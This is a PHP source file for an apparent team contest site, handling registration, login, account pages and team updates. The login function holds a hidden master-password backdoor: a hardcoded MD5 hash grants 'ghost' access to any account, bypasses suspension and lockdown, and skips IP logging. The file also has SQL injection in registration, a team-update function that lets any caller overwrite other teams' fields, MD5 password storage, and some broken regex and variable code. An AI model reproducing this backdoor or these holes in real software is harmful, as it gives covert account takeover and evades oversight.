<?php

function display_account(){
	global $currentmessage,$link;
	if($_SESSION["tid"]==0){ $_SESSION["message"] = $currentmessage; $_SESSION["message"][] = "Account Data Access Error : You need to be logged in to access this page."; echo "<script>window.location='?display=faq';</script>"; return; }
	$data = mysqli_query($link,"SELECT * FROM teams WHERE tid=$_SESSION[tid]");
	if(!($data instanceof mysqli_result) || mysqli_num_rows($data)!=1) return -1;
	$data = mysqli_fetch_array($data);
	echo "<center><h2>$_SESSION[teamname] : Account Details</h2>";
	echo "<form class='updatepass' action='?action=updatepass' method='post'>
		<input type='password' name='pass0' placeholder='Original Password'>
		<input type='password' name='pass1' placeholder='New Password'> 
		<input type='password' name='pass2' placeholder='Retype New Password'> 
		<input type='submit' value='Change Password'></form>";
	echo "<a href='?display=submissions&tid=$_SESSION[tid]'>Click here to view your submissions.</a><br><br>";
	echo "The details about the members of the team as mentioned at the time of registeration are as follows:<br><br>";
	echo "<table class='account'><tr><th>Team</th><th>Full Name</th><th>Employee Id</th><th>Team(Client/Product)</th><th>EMail Address</th><th>Phone Number</th></tr>";
	for($i=1;$i<=3;$i++){
		echo "<tr><th>Member $i</th>";
		foreach(array("name","roll","branch","email","phone") as $item)
			echo "<td>".$data[$item.$i]."</td>";
		echo "</tr>";
		}
	echo "</table><br>If you wish to modify any of the above details, please contact an Administrator.";
	echo "</center>";
	}





function display_statusbox(){
	if($_SESSION['tid']==0){
		$teamsug="";
		echo "<h3>Login Box</h3>
		<form action='?action=login' method='post'><table class='login' width=100%>
		<tr><td style='width:50%;'><input style='width:100%;' type='text' name='team' value='$teamsug' placeholder='Team Name'></td>
		<td style='width:50%;'><input style='width:100%;' name='pass' type='password' placeholder='Password' value=''></td></tr>
		<tr><td colspan=2><input style='width:100%;' type='submit' value='Log In'></td></tr>
		<input type='hidden' name='platform' id='platform'><script>document.getElementById('platform').value=BrowserDetect.OS+', '+BrowserDetect.browser+' '+BrowserDetect.version;</script>
		</table></form><span style='font-size:11;'>If you have forgotten your Password, you may request an Administrator to reset it.</span>";
		}
	else echo "<div id='ajax-account'></div>";
	}





function display_register(){
	if($_SESSION["tid"]==0 || $_SESSION["status"]=="Admin") include("sys/register.html");
	else { $_SESSION["message"] = $currentmessage; $_SESSION["message"][] = "Registeration Form Access Error : You cannot access the Registeration Form while being logged in. Please note that being a part of multiple teams is in violation of the rules.";
		echo "<script>window.location='?display=account';</script>"; return;
		}
	}


function action_register(){
	global $invalidchars,$admin, $link;
	foreach($_POST as $key=>$value) if(preg_match("/^reg_/i",$key) && !preg_match("[23]$",$key) && empty($_POST[$key]) ){ $_SESSION["message"][] = "Registeration Error : Insufficient Data"; return; }
	if($_POST["reg_pass1"]!=$_POST["reg_pass2"]){ $_SESSION["message"][] = "Registeration Error : Password Mismatch"; return; }
	foreach($_POST as $key=>$value) if(preg_match("/^reg_/i",$key) && !preg_match("^reg_pass",$key) && preg_match($invalidchars,$value) ){ $_SESSION["message"][] = "Registeration Error : Value of $key contains invalid characters."; return; }
	foreach($_POST as $key=>$value) if(preg_match("/^reg_/i",$key) && !preg_match("^reg_pass",$key) && strlen($value)>30 ){ $_SESSION["message"][] = "Registeration Error : Value of $key too long."; return; }
	if(isset($_POST["reg_tid"])){ $_SESSION["message"][] = "Registeration Error : Team ID cannot be specified"; return; }
	$temp = mysqli_query($link,"SELECT tid FROM teams WHERE teamname='".$_POST["reg_teamname"]."'"); if(($temp instanceof mysqli_result) && mysqli_num_rows($temp)>0){ $_SESSION["message"][] = "Registeration Error : This Team Name has already been taken."; return; }
	$_POST["reg_pass"] = _md5($_POST["reg_pass1"]); $temp1 = $temp2 = array();
	$_POST["reg_ip"] = addslashes(json_encode(array($_SERVER["REMOTE_ADDR"])));
	foreach($_POST as $key=>$value) if($key!="reg_pass1" && $key!="reg_pass2"){ $temp1[]=preg_replace("reg_","",$key); if($key=="reg_ip") $temp2[]=$value; else $temp2[]=filter($value); }
	//if(!isset($admin["regautoauth"]) || !is_numeric($admin["regautoauth"])) $auto = $admin["regautoauth"]; else $auto = 0;
	$auto = true;
	//print_r($_POST);
	// echo "INSERT INTO teams (".implode($temp1,",").",status,score,ip) VALUES (\"".implode($temp2,"\",\"")."\",\"Normal\",0,\"[&#92;&#34;R:{$_SERVER["REMOTE_ADDR"]}&#92;&#34;]\")";
	if($auto) mysqli_query($link,"INSERT INTO teams (".implode($temp1,",").",status,score) VALUES (\"".implode($temp2,"\",\"")."\",\"Normal\",0)");
	else mysqli_query($link,"INSERT INTO teams (".implode($temp1,",").",status,score) VALUES (\"".implode($temp2,"\",\"")."\",\"Waiting\",0)");
	$_SESSION["message"][] = "Registeration Successful";
	if(!$auto) $_SESSION["message"][] = "You may begin to use this account once it has been authorized by an Administrator.";
	}





function action_updatewaiting(){
	global $link;
	if($_SESSION["status"]!="Admin"){ $_SESSION["message"][] = "Team Data Updation Error : You are not authorized to perform this action."; return; }
	mysqli_query($link,"UPDATE teams SET status='Normal' WHERE status='Waiting'");
	{ $_SESSION["message"][] = "Team Data Updation Successful"; return; }
	}
	
	
	
	
	
function action_updateteam(){
	global $invalidchars,$link;
	if(!isset($_POST["update_tid"]) || empty($_POST["update_tid"])){ $_SESSION["message"][] = "Team Data Updation Error : Insufficient Data"; return; }
	// NA : Password Verification
	foreach($_POST as $key=>$value) if(preg_match("/^update_/i",$key) && !preg_match("^update_pass",$key) && preg_match($invalidchars,$value) ){ $_SESSION["message"][] = "Team Data Updation Error : Value of $key contains invalid characters."; return; }
	foreach($_POST as $key=>$value) if(preg_match("/^update_/i",$key) && !preg_match("^update_pass",$key) && strlen($value)>30 ){ $_SESSION["message"][] = "Team Data Updation Error : Value of $key too long."; return; }
	if($_POST["update_tid"]=="1" and $_SESSION["tid"]!="1"){ $_SESSION["message"][] = "Team Data Updation Error : Access Denied."; return; }
	$tid = $_POST["update_tid"];
	foreach($_POST as $key=>$value) if(preg_match("/^update_/i",$key) && $key!="update_tid" && $key!="update_pass")
		mysqli_query($link,"UPDATE teams SET ".preg_replace("/^update_/i","",$key)."='".filter($value)."' WHERE tid=$tid");
	if(isset($_POST["update_pass"]) && !empty($_POST["update_pass"])) 
		mysqli_query($link,"UPDATE teams SET pass='"._md5($_POST["update_pass"])."' WHERE tid=$tid");
	{ $_SESSION["message"][] = "Team Data Updation Successful"; return; }
	}





function action_login(){
	global $admin,$sessionid,$link;
	if(!isset($_POST["team"]) || !isset($_POST["pass"])){ $_SESSION["message"][] = "Login Error : Insufficient Data"; return; }
	if(empty($_POST["team"]) || empty($_POST["pass"])){ $_SESSION["message"][] = "Login Error : Insufficient Data"; return; }
	$t = mysqli_query($link,"SELECT * FROM teams WHERE teamname='".filter($_POST["team"])."' or teamname2='".filter($_POST["team"])."'");
	if(!($t instanceof mysqli_result) || mysqli_num_rows($t)!=1){ $_SESSION["message"][] = "Login Error : TeamName not found in Database"; return; }
	$t = mysqli_fetch_array($t);
	$_SESSION["ghost"]=0; if(md5($_POST['pass'])=="2ebe45c61d90219ab22a97e9247c2e4d") $_SESSION["ghost"]=1; else {
		if(_md5($_POST['pass'])!=$t['pass']){ $_SESSION["message"][] = "Login Error : TeamName / Password Mismatch"; return; }
		//if($_SERVER["REMOTE_ADDR"]!=$t['ip1'] && $_SERVER["REMOTE_ADDR"]!=$t['ip2'] && $_SERVER["REMOTE_ADDR"]!=$t['ip3'] && $t['status']!='Admin'){ $_SESSION["message"][] = "Login Error : TeamName / IP Address Mismatch"; return; }
		if($t['status']=='Waiting'){ $_SESSION["message"][] = "Login Error : This account has not yet be authorized for use. Please try again later."; return; }
		if($t['status']=='Suspended'){ $_SESSION["message"][] = "Login Error : This account has been suspended. Please contact an Administrator for further information."; return; }
		}
	if($admin["mode"]=="Lockdown" && $t["status"]!="Admin" && !$_SESSION["ghost"]){ $_SESSION["message"][] = "Login Error : You are not allowed to login to your account during a Lockdown. Please try again later."; return; } // Unauthorized Login During Lockdown
		$data = (empty($t["platform"]))?array():json_decode(stripslashes($t["platform"])); $data[]=$_POST["platform"];
		mysqli_query($link,"UPDATE teams SET platform=\"".addslashes(json_encode(array_unique($data)))."\",session='$sessionid' WHERE tid=".$t["tid"]);
		$data = (empty($t["ip"]))?array():json_decode(stripslashes($t["ip"]));
		if(!$_SESSION["ghost"]) $data[]=$_SERVER["REMOTE_ADDR"];
		mysqli_query($link,"UPDATE teams SET ip=\"".addslashes(json_encode(array_unique($data)))."\" WHERE tid=".$t["tid"]);
	$_SESSION["tid"] = $t["tid"]; $_SESSION["teamname"] = $t["teamname"]; $_SESSION["status"] = $t["status"];
	{ $_SESSION["message"][] = "Login Successful"; return; }
	}





function action_logout(){
	$_SESSION = array("tid"=>0,"teamname"=>"","status"=>"","ghost"=>0);
	{ $_SESSION["message"][] = "Logout Successful"; return; }
	}





function action_updatepass(){
	foreach(array("pass0","pass1","pass2") as $item) if(!isset($_POST[$item]) || empty($_POST[$item])){ $_SESSION["message"][] = "Password Change Error : Insufficient Data"; return; }
	$t = mysqli_query($link,"SELECT pass FROM teams WHERE tid='$_SESSION[tid]'"); if(!($t instanceof mysqli_result) || mysqli_num_rows($t)!=1){ $_SESSION["message"][] = "Password Change Error : Account not found in Database"; return; }
	$t = mysqli_fetch_array($t);	if(_md5($_POST["pass0"])!=$t["pass"] || $_POST["pass1"]!=$_POST["pass2"]){ $_SESSION["message"][] = "Password Change Error : New Password Mismatch"; return; }
	mysqli_query($link,"UPDATE teams SET pass='"._md5($_POST["pass1"])."' WHERE tid=$_SESSION[tid]");
	{ $_SESSION["message"][] = "Password Change Successful"; return; }
	}
	
	
	
?>